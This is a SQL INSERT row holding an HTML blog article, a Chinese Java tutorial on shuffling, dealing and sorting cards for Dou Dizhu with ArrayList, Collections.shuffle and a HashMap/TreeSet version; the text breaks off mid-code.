INSERT INTO `t_article` VALUES (45, '斗地主之洗牌发牌----Java篇', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"toc\"> \n  <h3>斗地主</h3> \n  <ul>\n   <li><a href=\"#_5\">案例分析</a></li>\n   <li><a href=\"#_16\">思路</a></li>\n   <li><a href=\"#_27\">代码实现</a></li>\n   <li><a href=\"#_131\">完整代码和演示结果</a></li>\n   <li><a href=\"#_222\">哈希表优化</a></li>\n  </ul> \n </div> \n <p></p> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h1><a id=\"_5\"></a>案例分析</h1> \n <p><strong>需求:</strong></p> \n <p>实现斗地主过程中的洗牌，发牌和看牌。</p> \n <p>并且确保每一位玩家手上拿到的牌是随机并且按照大小排序好的</p> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h1><a id=\"_16\"></a>思路</h1> \n <ol>\n  <li>创建一个牌盒，也就是定义一个集合对象，用ArrayList集合实现</li>\n  <li>往牌盒里面装牌</li>\n  <li>洗牌，也就是把牌打散，用Collections的shuffle()方法实现</li>\n  <li>发牌,也就是遍历结合，给三个玩家发牌</li>\n  <li>看牌，也就是三个玩家分别遍历自己的牌</li>\n </ol> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h1><a id=\"_27\"></a>代码实现</h1> \n <p><strong>1.创建牌盒，存放所有牌</strong></p> \n <pre><code class=\"prism language-cpp\"> <span class=\"token comment\">//创建一个牌盒，也就是定义一个集合对象，用ArrayList集合实现</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> poker<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre> \n <p><strong>2.往牌盒里面放入所有牌组</strong></p> \n <pre><code class=\"prism language-cpp\">       <span class=\"token comment\">//往牌盒里面装牌</span>\n        <span class=\"token comment\">/*\n            ◆2,◆3,◆4.....◆k,◆A\n            ♣2,...\n            ♥2,...\n            ♠2,...\n            小王  , 大王\n        */</span>\n        <span class=\"token comment\">//定义花色数组</span>\n        String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> colors<span class=\"token operator\">=</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"◆\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"♣\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"♥\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"♠\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//定义点数数组</span>\n        String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> numbers<span class=\"token operator\">=</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"9\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"10\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"J\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Q\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"K\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//将所有牌组合放入牌盒</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>String col<span class=\"token operator\">:</span>colors<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>String num<span class=\"token operator\">:</span>numbers<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                poker<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>col<span class=\"token operator\">+</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">//将最后两张大小王放入牌盒</span>\n        poker<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小王\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        poker<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"大王\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre> \n <p><strong>3. 洗牌，也就是把牌打散，用Collections的shuffle()方法实现</strong></p> \n <pre><code class=\"prism language-cpp\">  <span class=\"token comment\">//洗牌---把牌打乱</span>\n        Collections<span class=\"token punctuation\">.</span><span class=\"token function\">shuffle</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre> \n <p><strong>4. 发牌,也就是遍历结合，给三个玩家发牌</strong></p> \n <pre><code class=\"prism language-cpp\">    <span class=\"token comment\">//发牌--》遍历牌盒，给三个玩家发牌</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> p1<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> p2<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> p3<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//留下三张底牌</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> dp<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//将牌分发</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">&gt;=</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                dp<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                p1<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                p2<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                p3<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n</code></pre> \n <p><strong>5. 看牌，也就是三个玩家分别遍历自己的牌</strong></p> \n <pre><code class=\"prism language-cpp\">  <span class=\"token comment\">//看牌---分别展示三位玩家自己的牌</span>\n          <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"大忽悠\"</span><span class=\"token punctuation\">,</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小忽悠\"</span><span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超级无敌大忽悠\"</span><span class=\"token punctuation\">,</span>p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token comment\">//展示底牌</span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"底牌如下: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>var Dp<span class=\"token operator\">:</span>dp<span class=\"token punctuation\">)</span>\n            System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>Dp<span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre> \n <p>看牌的方法定义:</p> \n <pre><code class=\"prism language-cpp\"> <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span>  <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>String  name<span class=\"token punctuation\">,</span>ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> arr<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">+</span><span class=\"token string\">\"的牌: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n</code></pre> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h1><a id=\"_131\"></a>完整代码和演示结果</h1> \n <p>完整代码:</p> \n <pre><code class=\"prism language-cpp\">import java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>ArrayList<span class=\"token punctuation\">;</span>\nimport java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>Collections<span class=\"token punctuation\">;</span>\nimport java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>Scanner<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token comment\">//创建一个牌盒，也就是定义一个集合对象，用ArrayList集合实现</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> poker<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token comment\">//往牌盒里面装牌</span>\n        <span class=\"token comment\">/*\n            ◆2,◆3,◆4.....◆k,◆A\n            ♣2,...\n            ♥2,...\n            ♠2,...\n            小王  , 大王\n        */</span>\n        <span class=\"token comment\">//定义花色数组</span>\n        String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> colors<span class=\"token operator\">=</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"◆\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"♣\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"♥\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"♠\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//定义点数数组</span>\n        String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> numbers<span class=\"token operator\">=</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"5\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"6\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"7\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"8\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"9\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"10\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"J\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"Q\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"K\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"A\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//将所有牌组合放入牌盒</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>String col<span class=\"token operator\">:</span>colors<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>String num<span class=\"token operator\">:</span>numbers<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                poker<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>col<span class=\"token operator\">+</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">//将最后两张大小王放入牌盒</span>\n        poker<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小王\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        poker<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"大王\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//洗牌---把牌打乱</span>\n        Collections<span class=\"token punctuation\">.</span><span class=\"token function\">shuffle</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token comment\">//发牌--》遍历牌盒，给三个玩家发牌</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> p1<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> p2<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> p3<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//留下三张底牌</span>\n        ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> dp<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//将牌分发</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">&gt;=</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                dp<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                p1<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                p2<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">%</span><span class=\"token number\">3</span><span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{\n    <!-- --></span>\n                p3<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>poker<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n         <span class=\"token comment\">//看牌---分别展示三位玩家自己的牌</span>\n          <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"大忽悠\"</span><span class=\"token punctuation\">,</span>p1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"小忽悠\"</span><span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"超级无敌大忽悠\"</span><span class=\"token punctuation\">,</span>p3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token comment\">//展示底牌</span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"底牌如下: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>var Dp<span class=\"token operator\">:</span>dp<span class=\"token punctuation\">)</span>\n            System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>Dp<span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span>  <span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>String  name<span class=\"token punctuation\">,</span>ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> arr<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">+</span><span class=\"token string\">\"的牌: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{\n    <!-- --></span>\n            System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611185647408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMTU3MTcz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h1><a id=\"_222\"></a>哈希表优化</h1> \n <p><strong>区别:</strong> 上面是用一个字符串数组来存储所有牌的组合，并且也是对字符串数组进行洗牌操作，较为麻烦，而用哈希表之后，我们可以对每一张牌对应的索引进行洗牌操作。</p> \n <p><strong>并且上面也要求了，对每一位玩家的牌进行排序，而上面我们并没有实现，因此下面我们使用Treeset来保存每一位玩家所拿到的牌，确保完成了排序功能</strong></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210611190108374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMTU3MTcz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p><strong>思路：</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210611190201358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzMTU3MTcz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p>代码实现:</p> \n <pre><code class=\"prism language-cpp\">import java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span><span class=\"token operator\">*</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span>\n<span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token comment\">//HashMap存放索引和对应的牌</span>\n        HashMap<span class=\"token operator\">&lt;</span>Integer<span class=\"token punctuation\">,</span>String<span class=\"token operator\">&gt;</span> map<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> HashMap<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//存放索引的数组</span>\n        ArrayList<span class=\"token operator\">&lt;</span>Integer<span class=\"token operator\">&gt;</span> index<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> ArrayList<span class=\"token operator\">&lt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//花色和点数数组</span>\n        String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> colors<span class=\"token operator\">=</span><span class=\"token punctuation\">{\n    <!-- --></span><span class=\"token string\">\"◆\"</span><span class=\"token punctuation\">,</span><span class=\"token 